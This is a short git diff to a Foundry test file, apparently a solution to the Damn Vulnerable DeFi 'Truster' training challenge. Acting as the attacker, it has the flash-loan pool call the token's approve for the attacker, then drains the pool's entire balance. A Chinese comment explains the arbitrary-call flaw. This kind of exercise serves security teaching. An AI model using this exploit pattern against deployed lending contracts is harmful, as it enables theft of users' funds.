@@ -41,7 +41,17 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
 
+        // 因為 trusterLenderPool 能讓 user 決定要對 哪個地址 執行什麼 function，所以可以讓 Pool 執行 dvt 的 approve，並把 attacker 設為 spender
+        bytes4 functionSelector = bytes4(keccak256("approve(address,uint256)"));
+        bytes memory data = abi.encode(attacker, type(uint256).max);
+        bytes memory dataWithSelector = abi.encodePacked(functionSelector, data);
+
+        trusterLenderPool.flashLoan(0, address(1), address(dvt), dataWithSelector);
+        dvt.transferFrom(address(trusterLenderPool), attacker, dvt.balanceOf(address(trusterLenderPool)));
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
